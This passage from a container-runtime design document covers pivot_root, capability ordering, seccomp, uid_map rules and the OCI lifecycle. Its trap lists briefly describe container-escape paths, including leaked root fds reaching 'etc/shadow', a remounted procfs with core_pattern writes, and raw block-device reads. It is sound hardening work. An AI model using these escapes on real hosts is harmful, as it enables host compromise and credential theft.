oldroot = open("/",  O_DIRECTORY|O_RDONLY|O_PATH);   /* fd on the OLD root, held */
newroot = open(rootfs, O_DIRECTORY|O_RDONLY|O_PATH); /* fd on the NEW root */
fchdir(newroot);                                     /* cwd = new root */
pivot_root(".", ".");                                /* both args "." — legal and idiomatic */
fchdir(oldroot);                                     /* back to the old root, via fd only */
mount("", ".", "", MS_SLAVE|MS_REC, NULL);           /* old root: rslave, before detaching */
umount2(".", MNT_DETACH);                            /* lazy detach — a sync umount is EBUSY */
chdir("/");                                          /* land in the new root */
close(oldroot); close(newroot);                      /* NOT optional, NOT merely cloexec */
```

Four things are non-obvious.

**`pivot_root(".", ".")` with both arguments the same** is legal. The old root ends up stacked on
top of the new root: `/` is the new root while the caller's cwd still refers to the old one. This
avoids requiring every container image to contain a `/.pivot_root` directory for `put_old`.

**The `O_PATH` fd on the old root is opened before the pivot** precisely so the process can `fchdir`
back to a root that no longer has any pathname.

**The old root is made `MS_SLAVE|MS_REC` immediately before the detach.** `MNT_DETACH` propagates
(§3.4), and after `pivot_root(".", ".")` the old root's own parent is the new (private) root — so
its *own* detach does not propagate, but its **descendants'** do, because their parents are still
peers of the host's mounts. This step is an independent defence from step 17 and neither replaces
the other.

**`MNT_DETACH` is mandatory, not a preference.** You are unmounting your own current directory; a
synchronous `umount` fails `EBUSY`.

> **Trap 3.** Leaving `put_old` mounted and reachable is a one-line escape: `chdir("/put_old")` and
> you are on the host filesystem. Detach it.

> **Trap 4.** The two `O_PATH` fds above *are* the escape, and they survive `MNT_DETACH` because the
> superblock lives as long as a reference does. Marking them close-on-exec at step 46 works only if
> nothing between here and `execve` leaks or execs them. Close them explicitly, here, where the
> reason is visible.

> **Trap 5.** Forgetting `chdir("/")` is invisible in testing: the shell starts, `pwd` prints
> something plausible, and the process's working directory is sitting in the old root. The kernel
> moves *other* tasks' cwd, never the caller's (measured, kernel 6.11.0-29: cwd after the pivot was
> `/oldroot/root`).

### 4.5 The capability and uid block, in the only order that works

**Fact.** Steps 37–43 have exactly one correct order, and it is driven by one sentence in
`capabilities(7)`: "even with the `SECBIT_KEEP_CAPS` flag set, the effective capabilities of a
thread are cleared when it switches its effective UID to a nonzero value." `PR_SET_KEEPCAPS`
preserves **permitted**, not **effective**; and `PR_CAPBSET_DROP` requires **effective**
`CAP_SETPCAP` (`PR_CAPBSET_DROP(2const)`, ERRORS: "`EPERM` The caller does not have the
`CAP_SETPCAP` capability" — `capable()` tests the effective set).

Therefore:

```
37  capset()              inheritable = {}          # close the inheritable hole first
38  PR_CAPBSET_DROP ×N                              # euid is STILL 0, so CAP_SETPCAP is effective
39  PR_SET_KEEPCAPS, 1                              # preserve PERMITTED across the uid change
40  setgroups(); setresgid(); setresuid()           # raw syscalls — euid 0 -> non-zero here
      └─ kernel wipes the EFFECTIVE set
41  PR_SET_KEEPCAPS, 0
42  capset()              permitted = effective = wanted
                          inheritable = ambient candidates only
43  PR_CAP_AMBIENT_RAISE ×N
```

> **Trap 6 — the highest-value trap in this document.** Putting the bounding-set drop *after* the
> uid change is the obvious ordering, it is what several published sequences prescribe, and it is
> wrong. After step 40 `CapEff` is 0, so `CAP_SETPCAP` is not effective, so **every**
> `PR_CAPBSET_DROP` returns `EPERM`. The failure mode is what makes it dangerous: for a `USER root`
> container the euid never leaves 0, the effective set is never cleared, and the sequence works — so
> it passes every smoke test. It fails only for non-root containers, which are exactly the ones
> where capability policy matters most, and it fails with an `EPERM` on a `prctl` that a naive
> implementation logs and continues past, leaving the container with the **host's full bounding
> set**.

**Convention.** runc does it in the working order, with the reason in the source
(`runc@v1.2.5/libcontainer/init_linux.go#L326-L362`, `finalizeNamespace()`): `ApplyBoundingSet()`
under the comment "drop capabilities in bounding set before changing user", then `SetKeepCaps()`,
then `setupUser()`, then `ClearKeepCaps()`, then `ApplyCaps()`.

Three further rules in the same block:

**Fact.** Step 42 is legal without holding any capability: `capset(2)` requires the new permitted to
be a subset of the **existing permitted** (which `KEEPCAPS` preserved) and the new effective to be a
subset of the new permitted. It is the step that undoes the kernel's effective-set wipe, and it has
no privilege precondition.

**Fact.** Only the **inheritable** set is clamped by bounding; the new permitted set is clamped by
the existing permitted, which a bounding drop does not touch. So "drop bounding first so `capset`
clamps correctly" is the wrong reason for the right ordering — the real reason is `CAP_SETPCAP`.

**Fact.** Step 37 is not decoration. `capset(2)`'s constraint on inheritable is "subset of existing
inheritable ∪ bounding", so an already-held inheritable bit *survives* a later bounding drop and
re-enters permitted at `execve` through `P'(permitted) = P(inheritable) | P(bounding)`. Clear
inheritable, then assert it stayed clear.

> **Trap 7.** Use **raw** `syscall(SYS_setresuid, …)`, not glibc's `setresuid`. glibc routes the
> whole `set*id` family through `INLINE_SETXID_SYSCALL`, which branches on `!SINGLE_THREAD_P` and,
> when the flag is set, calls `__nptl_setxid`: it takes `GL(dl_stack_cache_lock)` as its *first*
> statement, walks `GL(dl_stack_used)`, `tgkill`s every listed thread with `SIGSETXID`, and
> futex-waits until each acknowledges. In a raw-`clone3` child, `reclaim_stacks()` never ran, so that
> list still names the parent's threads — which do not exist. The futex wait never returns. The flag
> is `header.multiple_threads` in the TCB, inherited verbatim by the child and never reset by
> `clone3`, so the hang is conditional on the process *ever* having had a second thread — which is
> precisely the invariant step 9 asserts and that a transitive dependency can defeat without
> anyone noticing. Keep both defences.

### 4.6 `PR_SET_NO_NEW_PRIVS`, seccomp, and why there are two branches

**Fact — the only kernel rule.** `seccomp(2)`: installing a filter requires that "either the calling
thread must have the `CAP_SYS_ADMIN` capability in its user namespace, or the thread must already
have the `no_new_privs` bit set … Otherwise … fails and returns `EACCES`." Nothing else about
seccomp's position is kernel-enforced.

**Fact.** `PR_SET_NO_NEW_PRIVS` has no ordering relationship with the capability work. It does not
clear capabilities, it does not block `PR_CAPBSET_DROP` or `capset`, and it is irreversible and
inherited across `fork` and `execve`. Setting it at step 45 rather than step 36 is convention, not a
constraint. What it *does* do is make `execve` ignore setuid bits, file capabilities and LSM
transitions — which is why it belongs after everything that might have wanted them and before the
exec.

**Fact — hence two branches, and they are mutually exclusive:**

- **Branch A (step 36)** — when `no_new_privs` will **not** be set. The filter must be installed
  *while still holding `CAP_SYS_ADMIN`*, i.e. before the bounding-set drop at step 38.
- **Branch B (step 49)** — when `no_new_privs` **is** set. The filter goes last, one syscall before
  `execve`, so the smallest possible number of syscalls must be permitted by the profile.

**Recommendation.** Set `no_new_privs` unconditionally and implement branch B only. That collapses
the two branches into one — but **only** if the engine refuses to honour an
"allow-new-privileges" escape hatch for the *seccomp install* specifically. Offering that flag
quietly reintroduces branch A; say so explicitly rather than discovering it later.

**Convention.** Docker does *not* set `no_new_privs` by default: a live container measured on kernel
6.11.0-29 showed `NoNewPrivs: 0` with `Seccomp: 2` and one filter loaded, meaning runc took branch
A. runc's own `runc spec` default is the opposite — `NoNewPrivileges: true`
(`runc@v1.2.5/libcontainer/specconv/example.go`).

**Fact.** Step 46 (`close_range`) before step 49 (seccomp branch B) is deliberate, not incidental:
`close_range(2)`'s own rationale states the `CLOSE_RANGE_CLOEXEC` form exists so descriptors "can be
marked before the `seccomp(2)` profile is set up, and the profile can control access to
`close_range()` without affecting the calling process".

### 4.7 `uid_map` / `gid_map` — who may write them

**Fact.** A process that has just `unshare(CLONE_NEWUSER)`d **can** write its own `uid_map`,
provided the map is a single extent of length 1 mapping its own euid.
`v6.11/kernel/user_namespace.c#L1163` (`new_idmap_permitted`):

```c
	if ((new_map->nr_extents == 1) && (new_map->extent[0].count == 1) &&
	    uid_eq(ns->owner, cred->euid)) {
		u32 id = new_map->extent[0].lower_first;
		if (cap_setid == CAP_SETUID) {
			kuid_t uid = make_kuid(ns->parent, id);
			if (uid_eq(uid, cred->euid))
				return true;     /* self-map of own euid: allowed */
```

This is exactly what `unshare --map-root-user` and `podman unshare` do. What a child *cannot* write
is a **multi-extent or length > 1** map: that needs `ns_capable(ns->parent, CAP_SETUID) &&
file_ns_capable(file, ns->parent, CAP_SETUID)`, i.e. a privileged writer in the parent namespace —
in practice the setuid `newuidmap`/`newgidmap` helpers plus `/etc/subuid`.

**Recommendation.** The commonly stated rule "a user namespace forces a three-process topology" is
too strong. The intermediate process exists for `/etc/subuid`-style multi-ID maps, not for
id-mapping as such. **Single-ID rootless — one uid mapped, the user's own — needs no third process
and no change to the supervisor/child topology.** That is a legitimate intermediate rung between the
root MVP and full subuid rootless, and it costs nothing structural.

**Fact — four writer rules that produce confusing errnos:**

- Writing `gid_map` requires `"deny"` be written to `/proc/<pid>/setgroups` **first** (unless the
  writer holds `CAP_SETGID` in the parent namespace), and once `gid_map` is written the `setgroups`
  file can no longer be set to deny (`EPERM`). CVE-2014-8989 is why.
- The writer must hold `CAP_SYS_ADMIN` **in the target user namespace**, checked against the
  credentials of the process that **opened** the file (`file_ns_capable(file, map_ns,
  CAP_SYS_ADMIN)`, `v6.11/kernel/user_namespace.c#L977`). An fd opened *before* the target unshared
  is useless.
- Mapping parent uid 0 additionally requires `CAP_SETFCAP` in the parent (`verify_root_map`,
  `#L881`). A map that works as real root fails for a semi-privileged helper, with `EPERM` and no
  explanation.
- The maps are **write-once**; the whole map must be a single `write(2)` of less than one page at
  offset 0; the line limit is 5 up to Linux 4.14 and 340 since Linux 4.16.

**Fact.** The maps must land before the child's `execve`, or the child's capabilities are cleared by
it: for a non-setuid file with no file capabilities, `P'(permitted) = P'(ambient) = 0` unless the
euid is 0 *in that namespace* (§2.1.6). This makes `uid_map` timing a correctness issue, not a
convenience.

### 4.8 Why there is a parent and a child at all

Four independent reasons, none of which can be engineered away.

1. **Namespace membership is decided at clone time and mostly cannot be changed afterwards.** The
   supervisor literally cannot mount into a mount namespace it is not in, and cannot create a procfs
   instance for a PID namespace it is not in (§4.3). Steps 14 and 17–34 must be the child's.
2. **Some privileged setup must come from outside the new namespaces.** Multi-extent `uid_map`
   writes, moving a veth into the child's netns, writing the child's `cgroup.procs` on the fallback
   path — all are the supervisor's, and all must complete before the child `execve`s.
3. **Somebody has to survive to supervise.** The exit status, the pidfd poll, the cgroup teardown,
   the netns cleanup and the log stream all need a process that is not the workload.
4. **Some setup needs privilege the child is about to destroy.** Everything in steps 17–35 requires
   capabilities that step 38 drops irreversibly.

**Fact — what the supervisor may and may not conclude about signals.** A signal whose disposition is
`SIG_DFL` is discarded for a namespace init unless it is `SIGKILL`/`SIGSTOP` from an ancestor
namespace, or kernel-originated (§2.1.2). `kill(2)` and `pidfd_send_signal(2)` both return **0** for
a discarded signal. Therefore: `stop` must send `SIGTERM`, wait a grace period, then `SIGKILL`, and
must never interpret a successful return as delivery. The backstop for a container whose init is
blocked uninterruptibly or whose pid cannot be named is `cgroup.kill`, which signals with
`SEND_SIG_PRIV` and therefore *does* reach a namespace init.

**Fact — teardown needs no polling.** When the supervisor's `waitid(P_PIDFD)` reports the init
exited, the PID namespace is already empty: the exiting init runs `zap_pid_ns_processes`, which
disables pid allocation, `SIGKILL`s every pid in the namespace *including those in descendant PID
namespaces*, and then blocks until `pid_ns->pid_allocated == init_pids`
(`v6.11/kernel/pid_namespace.c#L170`). The one thing that does **not** disappear is the namespace
*object*, which lives as long as any nsfs fd or bind mount references it — a leak the supervisor's
own state tracking can cause and the kernel will not clean up.

### 4.9 Order-dependence: kernel rule versus convention

**Fact.** Enforced by the kernel — getting these wrong produces an error or a wrong result, not a
style complaint:

| Constraint | Mechanism |
|---|---|
| Namespaces are created *by* the clone, not configured after it | `clone(2)`; only the `unshare`/`setns` paths differ |
| **cgroup placement before cgroup-namespace creation** | `copy_cgroup_ns` uses `current`'s css_set (`v6.11/kernel/cgroup/namespace.c#L75`) |
| **rootfs-parent `MS_PRIVATE` before the rootfs self-bind** | `clone_mnt` copies propagation from the source at bind time (`v6.11/fs/namespace.c#L1320`) |
| The three mounts tested by `pivot_root` must not be `MS_SHARED` | `v6.11/fs/namespace.c#L4338` |
| `new_root` must already be a mount point, and must not be the current root | `path_mounted()`; `EBUSY` |
| **`/proc` mounted by a process already in the target PID namespace** | `proc_init_fs_context` pins `task_active_pid_ns(current)` |
| sysfs needs the net ns, mqueue the IPC ns — *when inside a user namespace* | `mount_capable()` → `ns_capable(fc->user_ns, …)` |
| **All mounts before `umount2(put_old, MNT_DETACH)`** | Nothing outside the new root has a pathname afterwards |
| `chdir("/")` after `pivot_root` | `pivot_root(2)` moves *other* tasks' cwd, never the caller's |
| `/dev` tmpfs and its nodes before `/dev/null`-masking of `/proc/*` | The bind source must exist |
| `/dev/pts` mounted before `setsid` + `TIOCSCTTY` | You cannot open a slave from an unmounted devpts |
| `setsid()` before `TIOCSCTTY` | `EPERM` without session leadership |
| **Bounding-set drop before the uid change** | `PR_CAPBSET_DROP` needs *effective* `CAP_SETPCAP`; euid 0→non-zero wipes effective |
| `PR_SET_KEEPCAPS` around the uid change | `capabilities(7)`: uid 0→non-0 clears permitted without it |
| `capset` of the remaining sets **after** the uid change | Same clearing rule; this is what restores effective |
| Ambient raise after the capability is in both permitted and inheritable | The ambient invariant |
| `PR_SET_NO_NEW_PRIVS` before seccomp **unless** `CAP_SYS_ADMIN` is held | `seccomp(2)` → `EACCES` |
| `setgroups=deny` before `gid_map`; both write-once | `user_namespaces(7)` |
| `uid_map`/`gid_map` before the child's `execve` | Capabilities from a userns do not survive exec without uid 0 mapped |

**Convention.** Strongly motivated but not kernel-enforced — these are discipline, and the honest
reason matters because a reader who re-derives from a wrong reason reaches a wrong conclusion
somewhere else:

| Constraint | The real reason |
|---|---|
| `MS_REC\|MS_SLAVE` on `/` before the first mount | Not "otherwise every container mount leaks": the container's own mounts are already non-propagating once step 18 makes the rootfs's parent private. The real exposures are (a) **bind-mounted volumes inherit the *source's* peer group**, so without it every `-v` is a two-way channel; (b) any mount made *outside* the rootfs subtree does leak; (c) defence in depth for the old-root detach; (d) it is the knob OCI's `linux.rootfsPropagation` maps onto. For a volume-less MVP it is cheap insurance, not a load-bearing wall |
| `MS_SLAVE` rather than `MS_PRIVATE` on `/` | The choice is decided at every later **bind**, not once on `/`. With `rslave` a host volume bound in is a slave of the host's peer group, so a host-side `mount`/`umount` under it reaches the container; with `rprivate` the container keeps a stale view of a torn-down subtree. For a container with no bind mounts the two are behaviourally identical |
| Network plumbing before the child's capability drop | The plumbing is the **supervisor's** work and the child's drop cannot affect the supervisor's capabilities. The true constraint is "before the child `execve`s", which is what the step-47/48 sync point is for |
| seccomp last (branch B) | Every syscall after it must be in the profile |
| `close_range` sweep immediately before `execve` | Nothing kernel-enforced; it is the CVE-2024-21626 discipline |
| Flush stdio before the clone | Prevents inherited-buffer duplication; nothing errors if you skip it |

### 4.10 Trap index

The traps above, plus the remaining ones, in one place. Each is a thing that appears to work in
testing and is wrong.

1. **`CLONE_NEWCGROUP` + `CLONE_INTO_CGROUP` in one `clone3`** — composes without error, roots the
   namespace at the supervisor's cgroup. (§4.2)
2. **A PID namespace without a fresh `/proc`** — shows all host processes. Measured: 164. (§4.3)
3. **Leaving `put_old` mounted** — `chdir("/put_old")` is the escape. (§4.4)
4. **Holding `O_PATH` fds on the old root across `execve`** — `MNT_DETACH` removes the pathname, not
   the object; `openat(fd, "etc/shadow")` still resolves. CVE-2024-21626. (§4.4)
5. **Omitting `chdir("/")` after `pivot_root`** — invisible in testing, cwd stays outside the root.
   (§4.4)
6. **Dropping the bounding set after the uid change** — `EPERM` for every non-root container,
   silent success for `USER root`, so it survives smoke tests. (§4.5)
7. **glibc `setresuid` in the cloned child** — `SIGSETXID` broadcast to a stale thread list,
   uninterruptible futex, no diagnostic. (§4.5)
8. **`/dev/null` missing from `/dev`** — measured on kernel 6.11.0-29 in a pivoted rootfs with an
   empty `/dev`: `echo x > /dev/null` **succeeded**, by creating a regular file named `null`. Every
   `2>/dev/null` in every script in the image becomes a disk-filling append. It fails silently at
   build time and surfaces as a full filesystem weeks later.
9. **Masking a `/proc` path by binding `/dev/null` from a rootfs path** — the source can be swapped
   by the image. CVE-2025-31133. Hold an fd to a *verified* character device 1:3 obtained before the
   pivot and bind from `/proc/self/fd/<n>`. Relatedly, CVE-2025-52565: masking must be applied
   before any bind whose destination is a rootfs path. And the mitigating condition both crun
   advisories name explicitly is **"a fresh tmpfs on `/dev`"** — so step 21 is a security
   requirement with CVE evidence, not a convention.
10. **Trusting `maskedPaths` as a boundary** — masking is per-superblock; procfs uses
    `get_tree_nodev()`, so a second `mount -t proc` yields a clean, unmasked instance. Measured on
    kernel 6.11.0-29: superblocks `0:62` and `0:67` side by side, `/proc/kcore` present in the
    second. Masking counts only once `CAP_SYS_ADMIN` is dropped or `mount` is seccomp-blocked.
11. **`newinstance` on devpts** — parsed and ignored (`v6.11/fs/devpts/inode.c`: `case
    Opt_newinstance: break;`), and never emitted by `devpts_show_options()`. Modern kernels always
    create a new instance per mount. runc still passes it; it is harmless and is a clean example of
    a convention outliving its cause.
12. **A recursive read-only bind done with `MS_BIND|MS_REMOUNT`** — nested submounts stay writable,
    silently. Only `mount_setattr(AT_RECURSIVE)` (5.12) is correct.
13. **`CLOSE_RANGE_CLOEXEC` assumed present because `close_range` is** — flag 5.11, syscall 5.9.
    (§3.10)
14. **`clone3` with the exit signal ORed into `flags`, or with `size < 88` plus
    `CLONE_INTO_CGROUP`** — `EINVAL`, and in the second case the race-free cgroup placement is lost
    with no hint why. (§3.1)
15. **`libc::CLONE_INTO_CGROUP` in Rust** — declared `c_int` on glibc targets (libc 0.2.191,
    upstream issue #3584) so the 2³³ literal **truncates to 0**, and absent entirely on musl. The
    `clone3` then succeeds, returns a pid, and the child is in the *supervisor's* cgroup with no
    error to catch. Define the constant yourself: `const CLONE_INTO_CGROUP: u64 = 1 << 33;`.
16. **Interpreting a successful `kill`/`pidfd_send_signal` as delivery** — it means "accepted", and
    a `SIG_DFL` signal to a namespace init is discarded. (§4.8)
17. **Learning these mechanics under `unshare -m`** — it silently defaults to
    `--propagation private`, hiding exactly the failures you need to see. (§3.6)
18. **`mknod` for device nodes on the rootless path** — `EPERM` even with a full 41-capability
    `CapEff`, because `CAP_MKNOD` is one of the capabilities that only works in the initial user
    namespace. Measured on kernel 4.18.0-425. (§2.1.6)

### 4.11 What the MVP omits, and what each omission costs

The MVP's version of the sequence runs steps 1–34 and 44, 46–48, 50–51, and skips the hardening
block. Stated as consequences, not as comparisons.

| Omitted | Consequence, stated honestly |
|---|---|
| **Capability bounding-set drop** (38) | Container PID 1 holds all ~41 capabilities **in the initial user namespace**. `CAP_SYS_ADMIN` alone is a complete escape: mount a second procfs (unmasked, §4.10 trap 10) and write `/proc/sys/kernel/core_pattern`. This is the single largest gap and the cheapest to close |
| **seccomp filter** (36/49) | The whole kernel syscall surface is reachable, including every syscall with a current or future local privilege escalation |
| **`PR_SET_NO_NEW_PRIVS`** (45) | A setuid binary or a file capability inside the image regains privilege at `execve`. Images ship working `sudo`, `ping` and `passwd`, so this is reachable, not theoretical |
| **LSM label** (35) | No second, independent layer. The `/proc` and `/sys` writes that published escapes target are unmediated |
| **`maskedPaths` / `readonlyPaths`** (30) | `/proc/kcore` is a readable image of physical memory; `/proc/sys/kernel/core_pattern` and `/proc/sysrq-trigger` are writable. Note this is additive with the capability omission, not independent of it |
| **Device cgroup** | Nothing gates `open()` on a device node. Combined with `CAP_MKNOD` being held, the container can create a node for the host's root block device and read it raw |
| **User namespace** (15) | Container uid 0 is host uid 0. Every capability above is a *host* capability, and one kernel bug is a full host compromise. File ownership on any bind mount is unmediated |
| **An init process as PID 1** | `SIGTERM` to the workload is silently discarded unless the workload installed a handler, so every `stop` costs the full grace period and then `SIGKILL`s. Orphaned grandchildren are never reaped and accumulate as zombies holding PID-table slots. Exit-status reporting is unreliable in a specific way: a process that "should" have died by signal can exit 0 instead, so `state`/`inspect` must not claim `ExitCode`/`Signal` fidelity the engine does not have |
| **Volumes and user bind mounts** (29) | No data persistence. Also the reason step 17's `MS_REC\|MS_SLAVE` is insurance rather than load-bearing at this stage |
| **Network beyond `lo`** (16) | No DNS, no package installs, no outbound traffic. The isolation is correct; the container looks broken to a user |
| **`/dev/mqueue`** (25) | POSIX message queues unavailable. Nothing in a normal image uses them |

**Recommendation.** Label the MVP for what it is: **a process-isolation boundary, not a security
boundary.** It contains accidents and cooperative workloads; it does not contain code that is trying
to get out. Do not describe it by comparison to another runtime's defaults — a runtime that ships
without a capability drop is not in the same category as one that ships with a 14-capability
bounding set, a seccomp filter and an LSM profile, regardless of which namespaces each creates. The
first hardening increment to add is step 38, the bounding-set drop: it is roughly twenty lines, it
costs nothing in image compatibility, and it is where the published escapes aim.

### What this decides

| Decision | Urgency |
|---|---|
| `CLONE_NEWCGROUP` out of the clone flags and into a child `unshare` after placement | **Urgent** — it is wrong in the obvious formulation and silent when wrong |
| `no_new_privs` unconditionally (one seccomp branch) versus an `allow-new-privileges` escape hatch (two branches) | **Urgent** — it decides whether the seccomp install has one code path or two, forever |
| Whether the capability bounding-set drop is in the MVP or deferred | **Urgent** — it is the difference between the two honest labels in §4.11 |
| Whether `mydocker stop` grace handling is PID-1-signal based, `cgroup.kill` based, or both | Deferrable — but the supervisor must never treat a successful `kill` as delivery from day one |
| Single-ID rootless as an intermediate rung (no third process) versus going straight to subuid | Deferrable — it changes no process topology, so it can be added later without rework |
| Design A (workload as PID 1) versus an injected init | Deferrable — keep the `execve` of the user command behind one call site so an init can be interposed without restructuring |

---

## 5. Container lifecycle

The OCI Runtime Specification defines a four-state machine and five operations. Everything
else in this section — the create/start rendezvous, signal delivery, exit-status collection,
teardown — is mechanism that the spec deliberately leaves to the implementation, and each
piece has a specific kernel behaviour that decides how it must be built.

All spec citations are to `runtime-spec@v1.3.0` (published 2025-11-04, the current released
revision; no v1.3.1 or later exists as of 2026-10). Where `main` has moved ahead of the
release, it is called out explicitly.

### 5.1 The state machine

**Fact.** `runtime-spec@v1.3.0/runtime.md §State` defines exactly four `status` values:

| Status | Definition (spec wording, condensed) |
|---|---|
| `creating` | the container is being created — the `create` operation is in flight |
| `created` | the runtime has finished `create`; the container process has neither exited nor executed the user-specified program |
| `running` | the container process has executed the user-specified program and has not exited (after lifecycle step 8) |
| `stopped` | the container process has exited |

**Fact.** Additional status values MAY be defined by a runtime, but *"they MUST be used to
represent new runtime states not defined above"* — a runtime may not invent a synonym for one
of the four. runc's `paused` is therefore explicitly sanctioned, not merely tolerated.

**Fact.** The state document returned by `state` MUST validate against
`runtime-spec@v1.3.0/schema/state-schema.json`, and on Linux `pid` is REQUIRED whenever
`status` is `created` or `running`.

**Fact.** The transitions are: `creating → created` on successful `create`; `created →
running` on `start`; `running → stopped` on container-process exit; `stopped → (gone)` on
`delete`.

**Recommendation.** Persist an explicit `status` field, written at each transition, and derive
nothing. runc instead infers `created` vs `running` from whether the exec FIFO file still
exists (`runc@v1.5.2/libcontainer/container_linux.go`), which conflates "the FIFO inode is
present" with "`start` has not been called". The tradeoff is one atomic rewrite per
transition against a state machine that can be debugged by reading one file.

**Recommendation.** Our internal status set should be a superset of the four
(`creating|created|running|exited|unknown`), with a projection to the spec's four for `state`
output. `unknown` is the honest answer when a container's supervisor died and nobody holds
its exit status; it has no spec equivalent and must never be reported through `state`, where
it would have to project to `stopped`.

### 5.2 The five operations

**Fact.** `runtime-spec@v1.3.0/runtime.md §Operations` specifies five operations and
explicitly disclaims mandating a CLI: *"these operations are not specifying any command-line
APIs, and the parameters are inputs for general operations."*

| Op | MUST | Error condition |
|---|---|---|
| `state` | return the state as specified in the State section | container does not exist |
| `create` | create a new container; apply **all** `config.json` properties except `process` | id not unique; properties cannot be applied |
| `start` | run the user-specified program as specified by `process` | container not in `created`; `process` not set |
| `kill` | send the specified signal to the container process | container neither `created` nor `running` → "MUST have no effect on the container and MUST generate an error" |
| `delete` | delete the resources that were created during `create` | container not `stopped` (but see 5.8) |

**Fact.** `create` MUST NOT apply `process.args`: *"`process.args` MUST NOT be applied until
triggered by the `start` operation."* This, not hooks, is the spec's primary statement of the
create/start split.

**Fact.** `delete` carries a MUST NOT that constrains storage design directly: *"Note that
resources associated with the container, but not created by this container, MUST NOT be
deleted."* Deleting a container may not remove a shared image layer or a bind-mount source.

**Fact.** The minimal `config.json` a Linux runtime must accept is `ociVersion`, `root.path`,
`process.cwd`, `process.args[0]`, and `process.user.{uid,gid}`. `root` is annotated
`(object, OPTIONAL)` in `config.md` because there is exactly one platform class where it is
forbidden — Hyper-V containers — but the prose immediately below the annotation reads *"On
all other platforms, this field is REQUIRED."* On Linux `root` is required and `root.path` is
required within it. `bundle.md` matches: the bundle MUST contain `config.json` at its top
level, and contains a root filesystem directory referenced by `root.path` *"if that property
is set in `config.json`"*.

**Trap.** The OCI runtime-spec's own `schema/config-schema.json` at `v1.3.0` has a top-level
`"required": ["ociVersion"]` — that is the entire list. `root` is absent, `process.args` is
absent, `process.user` has no `required` at all, `mounts[].destination` is absent; the
`process` subschema's `required` is `["cwd"]` alone. A `config.json` containing only
`{"ociVersion":"1.3.0"}` validates cleanly against the official schema and is simultaneously
illegal on Linux per the normative prose. **Schema validation is a shape check, not a
correctness gate.** The five hard errors above must be hand-written.

**Fact.** `config.md@v1.3.0` L66: *"The runtime MUST mount entries in the listed order."*
Mount order is observable behaviour — a later mount shadows an earlier one — so `mounts` must
be represented as an ordered sequence, never a map.

### 5.3 The 13-step lifecycle and the corrected hook failure rule

**Fact.** `runtime-spec@v1.3.0/runtime.md §Lifecycle`:

```
 1. create <id> <bundle>  invoked
 2. container runtime environment MUST be created per config.json;
    the user-specified program MUST NOT be run at this time
 3. prestart hooks        (DEPRECATED)   fail -> error, STOP container, goto 12
 4. createRuntime hooks                  fail -> error, STOP container, goto 12
 5. createContainer hooks                fail -> error, STOP container, goto 12
 6. start <id>            invoked
 7. startContainer hooks                 fail -> error, STOP container, goto 12
 8. runtime MUST run process.args
 9. poststart hooks                      fail -> error, STOP container, goto 12
10. container process exits
11. delete <id>          invoked
12. container MUST be destroyed by undoing the steps performed during create
13. poststop hooks                       fail -> log a warning, lifecycle continues
```

**Fact.** Steps 3, 4, 5, 7 and 9 share one uniform failure rule: generate an error, stop the
container, continue at step 12. **Only step 13 (`poststop`) is log-and-continue.**

**Trap.** "A failing `poststart` hook is a logged warning and the container keeps running" is
`runtime-spec` 1.0.x behaviour and is widely repeated. It changed in v1.3.0. The diff between
`runtime.md@v1.2.0` and `runtime.md@v1.3.0` is **one line in the whole 150-line file**:

```
-  If any poststart hook fails, the runtime MUST log a warning, but the
   remaining hooks and lifecycle continue as if the hook had succeeded.
+  If any poststart hook fails, the runtime MUST generate an error, stop the
   container, and continue the lifecycle at step 12.
```

A runtime that logs and continues on a `poststart` failure is non-conformant against v1.3.0,
and the divergence only surfaces when somebody's notification hook starts failing and their
containers *don't* die the way the spec says they should.

**Fact.** `config.md` also changed between those revisions in a way that touches the hook
table: `prestart` was re-described from *"After the `start` operation is called but before the
user-specified program command is executed"* (v1.2.0) to *"During the create operation, after
the runtime environment has been created and before the pivot root or any equivalent
operation"* (v1.3.0).

**Fact.** Where each hook runs (`config.md@v1.3.0`):

| Hook | `path` resolves in | Executes in | What it is for |
|---|---|---|---|
| `prestart` | runtime ns | runtime ns | DEPRECATED. Legacy CNI hook point. |
| `createRuntime` | runtime ns | runtime ns | host-side setup now that the container's namespaces exist — moving a veth into the netns by the reported `pid`, device setup. Rootfs not yet pivoted. |
| `createContainer` | **runtime** ns | **container** ns | manipulate the container's mount namespace before pivot. Binary comes from the host, runs inside the container's mounts. |
| `startContainer` | container ns | container ns | last touch from inside, rootfs pivoted — `ldconfig`, injecting binaries. |
| `poststart` | runtime ns | runtime ns | notify external systems the container is live. |
| `poststop` | runtime ns | runtime ns | undo whatever `createRuntime` set up. |

**Fact.** Hook stdin receives the container **state** JSON. *"For hooks executed in the
runtime namespace, it is the pid as seen by the runtime. For hooks executed in the container
namespace, it is the pid as seen by the container."*

**Recommendation.** Defer hooks past phase 1. They are OPTIONAL, our networking is our own so
we need no CNI compatibility, and the two structurally hard ones (`createContainer`,
`startContainer`) require executing a host binary inside a partially-constructed container
namespace — a whole extra fork/setns path and a whole extra failure mode. When they are
implemented, implement `createRuntime` + `poststop` first (the pair networking needs) and use
the uniform failure rule for steps 3–9. Design the create path now with an explicit, named
point where each hook *would* be invoked, so adding them is filling in a call, not
restructuring.

### 5.4 `ociVersion` is effectively unvalidated

**Convention.** No reference runtime validates `ociVersion`.
`runc@v1.5.2/libcontainer/specconv/spec_linux.go#L622` reads the bundle's version into the
struct and then **overwrites** it — `config.Version = specs.Version` — with runc's own
vendored constant. There is no comparison, no range check, no error.
`crun@1.30.1/src/libcrun/container.c#L3232` does not round-trip it at all: it hardcodes
`const char *const OCI_CONFIG_VERSION = "1.0.0";` for `crun state` output. The spec's own
`state` example in `runtime.md` shows `"ociVersion": "0.2.0"`.

**Observation.** On `host-a` (Ubuntu 24.10, kernel 6.11.0-29-generic), the live bundles
declare one version and the runtime claims another, and nothing complains:
`sudo grep -ho '"ociVersion":"[^"]*"' /run/containerd/io.containerd.runtime.v2.task/moby/*/config.json | sort -u`
→ `"ociVersion":"1.2.1"`, while `runc --version` → `spec: 1.2.0`. The writer is moby, not
runc: `moby/moby@v28.3.1/vendor/modules.txt` vendors `runtime-spec v1.2.1`.

**Convention.** What the ecosystem emits today: runc 1.5.2 vendors `v1.3.0`; containerd
v2.4.2 vendors `v1.3.0` and writes `ociVersion: 1.3.0`; moby v28.3.1 vendors `v1.2.1`; crun
1.30.1 emits `1.0.0` and declares a features range of `1.0.0 … 1.1.0+dev`.

**Recommendation.** **Target 1.3.0. Emit `"ociVersion": "1.3.0"` in `state` output and in any
bundle we generate. On read, accept any value that parses as SemVer with major `1`; log at
WARN if major ≠ 1; never reject on version.** Matching the runc on one particular host is not
